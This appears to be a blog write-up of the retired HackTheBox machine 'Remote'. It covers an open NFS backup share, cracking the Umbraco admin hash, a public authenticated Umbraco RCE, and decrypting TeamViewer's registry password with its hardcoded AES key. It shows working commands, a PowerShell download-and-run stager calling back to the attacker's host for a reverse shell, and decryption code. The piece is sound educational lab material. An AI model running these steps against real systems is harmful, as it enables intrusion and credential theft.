---
layout: post
title: "The Backup That Talked"
subtitle: "HTB Remote, where a world-readable backup share hands you the admin hash, an old CMS runs your C# for you, and TeamViewer keeps the root password in a registry key it thought was a secret"
date: 2020-09-12 12:00:00 +0000
description: "An open NFS backup leaks a CMS hash, an authenticated Umbraco bug runs your code, and TeamViewer hands over the admin password it encrypted with a key everyone already has."
image: /assets/og/the-backup-that-talked.png
tags: [hackthebox, writeup]
---

Remote is a box about things that were supposed to stay private and didn't. A backup folder sits open to the whole network and hands you the admin's password hash like a receipt. An old content-management system has a feature that runs the code you paste into it, no questions asked, as long as you logged in first. And at the end a remote-control app keeps the Administrator password in a registry drawer, locked with a key that ships inside every copy of the program. Three secrets, none of them forced open. Each one was left where a stranger could reach it, scrambled with a lock everybody already owns, or built to do exactly what the attacker asked. You do not break Remote so much as walk through it picking up things people set down and forgot.

```
        R E M O T E
        ===========
        showmount -e   →  "/site_backups  (everyone)"
                          a backup folder, shared with the world
                   |
                   v
        inside: umbraco.sdf — the CMS database, in the clear.
        admin hash falls out. it cracks in seconds.
                   |
                   v
        log in. paste C# into a "template." the server runs it.
        then TeamViewer hands over the root password,
        locked with a key printed in its own source code.
                                            遠
```

## 0x01 · the open drawer

`nmap` paints a Windows host that is chatty in an unusual way. The web ports and SMB are expected. The one that should make you sit up is 2049.

```
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
80/tcp    open  http         Microsoft IIS httpd 10.0
111/tcp   open  rpcbind      2-4 (RPC #100000)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
2049/tcp  open  nlockmgr
5985/tcp  open  http         Microsoft HTTPAPI 2.0 (WinRM)
```

NFS on a Windows box is rare enough to be a tell. NFS is the Unix way of sharing a folder over the network, and like a lot of old file-sharing, it was built for a friendlier internet where "who is allowed to mount this" was an afterthought. Ask the server what it is willing to export and it answers honestly.

```
$ showmount -e 10.10.10.180
Export list for 10.10.10.180:
/site_backups (everyone)
```

`(everyone)` is the whole ballgame. A folder named `site_backups`, readable by anyone who asks. Picture a filing cabinet wheeled out to the lobby with a sticky note that says help yourself. You mount it like any drive.

```
# mkdir /mnt/remote
# mount -t nfs 10.10.10.180:/site_backups /mnt/remote -o nolock
```

## 0x02 · the database that came in the box

Inside is a full backup of an Umbraco site, the kind of folder a content-management system spreads across disk. The website front page already told us it runs Umbraco, an ASP.NET CMS, so the structure is familiar. What matters is sitting in `App_Data`.

```
$ ls /mnt/remote/App_Data/
Logs  Models  TEMP  umbraco.config  Umbraco.sdf
```

That `.sdf` is a SQL Server Compact database, a single-file database the app carries around. Nobody encrypted it. Nobody needed to, because it was never meant to leave the server. It left the server. Run `strings` over it and the user table spills out in readable chunks.

```
$ strings Umbraco.sdf | grep -i admin
admin@htb.local ... b8be16afba8c314ad33d812f22a04991b90e2aaa ...
```

There is the administrator email and, right next to it, a 40-character hash. Forty hex characters is the fingerprint of SHA1, and Umbraco of this era stored passwords as plain unsalted SHA1. Unsalted is the important word. It means the hash is just the password run through a public blender with no secret ingredient, so the same password always produces the same hash, which means somebody has almost certainly cracked it already and put the answer in a list.

```
$ hashcat -m 100 b8be16afba8c314ad33d812f22a04991b90e2aaa rockyou.txt
b8be16afba8c314ad33d812f22a04991b90e2aaa:baconandcheese
```

`baconandcheese`. The backup did the introductions; the missing salt did the rest.

## 0x03 · the template that ran your code

Browse to `/umbraco` and the login page accepts `admin@htb.local` / `baconandcheese`. Now the version number matters. This is Umbraco 7.12.4, and that exact build carries a documented authenticated remote-code-execution bug (Exploit-DB 46153). The word authenticated is why the backup mattered so much. The door was never going to open for a stranger, but we stopped being strangers two sections ago.

The hole lives in an old developer feature for building XSLT templates. XSLT is a little language for reshaping XML into HTML, and the .NET version of it allows a stylesheet to embed a block of C# in a `<msxsl:script>` tag and run it while the page renders. That is a feature, not a bug, right up until a website lets a logged-in user submit arbitrary stylesheets and then runs them on the server. Think of it like a print shop that offers to run any macro you write into your document, then prints the result. Hand them a document whose "formatting macro" is really start a program, and the press happily presses go.

The public exploit logs in to grab a valid session cookie, then posts a stylesheet whose C# block reaches out to your machine and runs a PowerShell one-liner. Prove it with something boring first.

```
$ python3 46153.py -u admin@htb.local -p baconandcheese \
    -i http://10.10.10.180 -c "powershell whoami"
iis apppool\defaultapppool
```

The shop ran your macro. Trade the `whoami` for a one-line stager that pulls a real shell off your box and runs it in memory.

```
# the C# inside the stylesheet just launches:
[ powershell stager: iex(downloadstring http://10.10.14.4/iceberg.ps1) ]
# and iceberg.ps1 is a Nishang Invoke-PowerShellTcp
[ powershell reverse shell back to 10.10.14.4 on 443 ]
```

Start a listener and catch the callback.

```
$ nc -lvnp 443
connect to [10.10.14.4] from 10.10.10.180
PS C:\windows\system32\inetsrv> whoami
iis apppool\defaultapppool
PS C:\Users\Public> type user.txt
████████████████████████████████
```

We land as `defaultapppool`, the low-privilege identity IIS runs sites under. A foothold, not a throne.

## 0x04 · the secret with a printed key

Poke at what is installed and one name stands out. TeamViewer, the remote-control app, version 7.0.43148, an old one, present and configured on this machine. TeamViewer of that vintage saved its unattended-access password in the registry, encrypted, under a key it assumed nobody would read.

```
PS> reg query "HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7"
    SecurityPasswordAES    REG_BINARY    FF9B1C73...
```

Encrypted sounds safe. It is not, and the reason is the whole lesson of the box compressed into one mistake. TeamViewer locked that value with AES, which is a genuinely strong lock, but it used the same key and the same starting value for every single installation on Earth, and that key is sitting in the source of Metasploit's `teamviewer_passwords` module for anyone to read. Picture a hotel that buys a thousand strong deadbolts and then keys every room to the identical master, then prints the master in the brochure. The bolt is excellent. The secret is that there is no secret.

So you pull the bytes out of the registry, and decrypt them with the key and IV everyone already has.

```python
from Crypto.Cipher import AES
key = b"\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00"
iv  = b"\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xF2\x5E\xA8\xD7\x04"
blob = bytes([255, 155, 28, 115, ...])   # the SecurityPasswordAES value
print(AES.new(key, AES.MODE_CBC, iv).decrypt(blob).decode("utf-16le"))
# !R3m0te!
```

`!R3m0te!`. And because that machine's Administrator reuses it, you do not need a shell trick to spend it. WinRM is open, so log in as yourself.

```
$ evil-winrm -i 10.10.10.180 -u administrator -p '!R3m0te!'
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
remote\administrator
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
████████████████████████████████
```

## 0x05 · the honest caveat

It is easy to read Remote as a museum of old software. Umbraco 7.12.4 is patched, TeamViewer fixed its key handling years ago, and nobody should be exporting an unencrypted CMS database to the lobby. All true, and all beside the point, because every step on this box is a habit, not a version number.

The backup is the one that should keep people up at night. There was no vulnerability in the share. NFS did exactly what it was told, which was let everyone read a folder, and someone told it that on purpose and forgot. You cannot patch your way out of a permission you set yourself. The same goes for the password hash, which was technically encrypted in the sense that nobody could read it directly, and totally useless as protection because it was unsalted and short and already living in a wordlist. A lock is only as good as the part of it that is actually a secret.

And TeamViewer is the cleanest sermon of all. The encryption was real, the algorithm was strong, the engineering was fine, and it protected nothing because the key was shared with the entire world. That is the trap people fall into. Encrypted feels like a finish line, but the only thing that ever made a cipher safe is the part you keep to yourself. The moment the key ships in the box, you have a very expensive way of storing a password in plain sight. Remote is four secrets that were each handled like they were safe, and not one of them was, because safe is about who can reach the key, never about how strong the lock looks.

## 0x06 · outro

```
the backup talked because someone shared it with everyone and walked away.
the hash fell because it was scrambled with no secret mixed in.
the cms ran your code because it called that a feature.
the strong lock opened because its key was printed in the manual.

four secrets, none of them stolen. each one was left in reach.

share nothing by accident. salt the secret. keep the key. wear black.

                                                            EOF
```

---

*HTB: Remote, retired 5 Sep 2020. An easy Windows box that is really a lecture on the difference between encrypted and safe. The bolt is fine. The key was never a secret.*